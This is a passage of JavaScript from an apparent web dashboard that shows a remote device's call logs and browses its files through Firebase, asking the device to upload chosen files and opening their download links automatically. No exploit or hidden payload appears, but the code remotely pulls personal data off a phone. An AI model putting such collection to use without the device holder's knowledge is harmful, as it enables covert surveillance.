                    const dateCell = document.createElement('td');
                    dateCell.textContent = date;
                    row.appendChild(numberCell);
                    row.appendChild(typeCell);
                    row.appendChild(durationCell);
                    row.appendChild(dateCell);
                    tableBody.appendChild(row);
                });
                table.appendChild(tableBody);
                modalBody.appendChild(table);
            } else {
                modalBody.innerHTML = '<p>No call logs found.</p>';
            }
        }, { once: true });
    }

    function openFileManagerModal(deviceKey, deviceName, user, deviceOwnerUid) {
        currentDeviceKey = deviceKey;
        const modal = document.getElementById('data-modal');
        const titleEl = document.getElementById('data-modal-title');
        titleEl.textContent = `File Manager for ${escapeHTML(deviceName)}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        modal.style.display = 'flex';
        const filesRef = ref(database, `users/${deviceOwnerUid}/devices/${deviceKey}/files`);
        onValue(filesRef, (snapshot) => {
            fullFileTree = snapshot.val();
            renderFileManager(modalBody, fullFileTree, []);
        });
        
        // Start listening for downloaded files ready to download
        listenForReadyFiles(deviceOwnerUid, deviceKey);
    }

    function renderFileManager(container, currentNode, path) {
        container.innerHTML = '';
        const pathString = path.length > 0 ? '/' + path.join('/') : '/';
        const header = document.createElement('div');
        header.className = 'file-manager-header';
        const backButton = document.createElement('button');
        backButton.innerHTML = '<i class="material-icons">arrow_back</i>';
        backButton.disabled = path.length === 0;
        backButton.addEventListener('click', () => {
            const newPath = path.slice(0, -1);
            let newCurrentNode = fullFileTree;
            newPath.forEach(p => newCurrentNode = newCurrentNode[p]?.children || {});
            renderFileManager(container, newCurrentNode, newPath);
        });
        const pathHeader = document.createElement('h4');
        pathHeader.textContent = `Path: ${escapeHTML(pathString)}`;
        header.appendChild(backButton);
        header.appendChild(pathHeader);
        container.appendChild(header);

        const list = document.createElement('ul');
        list.className = 'file-list data-table'; // Re-use data-table for styling
        if (currentNode && Object.keys(currentNode).length > 0) {
            for (const key in currentNode) {
                const node = currentNode[key];
                const listItem = document.createElement('li');
                listItem.className = 'file-item';
                let icon;
                // Security: Validate and escape file names
                const safeKey = escapeHTML(key.replace(/_/g, '.'));
                
                if (node.downloadUrl) {
                    icon = 'image';
                    const link = document.createElement('a');
                    link.href = node.downloadUrl;
                    link.target = '_blank';
                    link.rel = 'noopener noreferrer';
                    link.innerHTML = `<i class="material-icons">${icon}</i> `;
                    const textNode = document.createTextNode(safeKey);
                    link.appendChild(textNode);
                    listItem.appendChild(link);
                } else if (node.contentUri) {
                    icon = 'image';
                    const iconEl = document.createElement('i');
                    iconEl.className = 'material-icons';
                    iconEl.textContent = icon;
                    const textNode = document.createTextNode(safeKey);
                    listItem.appendChild(iconEl);
                    listItem.appendChild(textNode);
                    
                    // Add Download button
                    const downloadBtn = document.createElement('button');
                    downloadBtn.className = 'file-download-btn';
                    downloadBtn.title = `Download ${safeKey}`;
                    downloadBtn.innerHTML = '<i class="material-icons">download</i>';
                    downloadBtn.addEventListener('click', (e) => {
                        e.stopPropagation();
                        requestFileDownload(currentUser.uid, currentDeviceKey, node.contentUri, key.replace(/_/g, '.'));
                    });
                    listItem.appendChild(downloadBtn);
                    
                    listItem.style.cursor = 'pointer';
                    listItem.addEventListener('click', () => requestUpload(key, node, path));
                } else if (node.isDirectory) {
                    icon = 'folder';
                    const iconEl = document.createElement('i');
                    iconEl.className = 'material-icons';
                    iconEl.textContent = icon;
                    const textNode = document.createTextNode(safeKey);
                    listItem.appendChild(iconEl);
                    listItem.appendChild(textNode);
                    listItem.style.cursor = 'pointer';
                    listItem.addEventListener('click', () => renderFileManager(container, node.children, [...path, key]));
                } else {
                    icon = 'description';
                    const iconEl = document.createElement('i');
                    iconEl.className = 'material-icons';
                    iconEl.textContent = icon;
                    const textNode = document.createTextNode(safeKey);
                    listItem.appendChild(iconEl);
                    listItem.appendChild(textNode);
                }
                list.appendChild(listItem);
            }
        } else {
            const emptyItem = document.createElement('li');
            emptyItem.textContent = 'Folder is empty.';
            emptyItem.className = 'file-item';
            list.appendChild(emptyItem);
        }
        container.appendChild(list);
    }

    function requestUpload(fileName, node, path) {
        if (!currentUser || !currentDeviceKey) return;
        let fileDbPath = `users/${currentUser.uid}/devices/${currentDeviceKey}/files`;
        path.forEach(p => fileDbPath += `/${p}/children`);
        fileDbPath += `/${fileName}`;
        const commandRef = ref(database, `users/${currentUser.uid}/devices/${currentDeviceKey}/upload_requests/${fileName}`);
        const filePath = `files/${currentDeviceKey}/${path.join('/')}/${fileName.replace(/_/g, '.')} `;
        set(commandRef, { contentUri: node.contentUri, filePath, fileDbPath });
    }
    
    const modalOverlay = document.getElementById('data-modal');
    modalOverlay.addEventListener('click', (e) => { 
        if (e.target === modalOverlay) { 
            modalOverlay.style.display = 'none';
        }
    });
    document.getElementById('data-modal-close').addEventListener('click', () => { 
        document.getElementById('data-modal').style.display = 'none';
    });

    // File download functions
    function requestFileDownload(userId, deviceModel, contentUri, fileName) {
        const requestsRef = ref(database, `users/${userId}/devices/${deviceModel}/upload_requests`);
        const newRequest = push(requestsRef);
        set(newRequest, {
            contentUri: contentUri,
            name: fileName
        });
        console.log(`Download requested for ${fileName}`);
    }

    function listenForReadyFiles(userId, deviceModel) {
        const uploadedFilesRef = ref(database, `users/${userId}/devices/${deviceModel}/uploaded_files`);
        onValue(uploadedFilesRef, (snapshot) => {
            snapshot.forEach((childSnapshot) => {
                const fileData = childSnapshot.val();
                if (fileData && fileData.downloadUrl) {
                    console.log(`File '${fileData.name}' is ready. Downloading...`);
                    
                    // Open the URL to trigger the browser's download prompt.
                    window.open(fileData.downloadUrl, '_blank');

                    // Clean up the entry from Firebase after download is initiated.
                    remove(childSnapshot.ref);
                }
            });
        });
    }
});

function stringToColor(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = str.charCodeAt(i) + ((hash << 5) - hash);
    }
    let color = '#';
    for (let i = 0; i < 3; i++) {
        const value = (hash >> (i * 8)) & 0xFF;
        const darkerValue = Math.floor(value * 0.4) + 50;
        color += ('00' + darkerValue.toString(16)).substr(-2);
    }
    return color;
}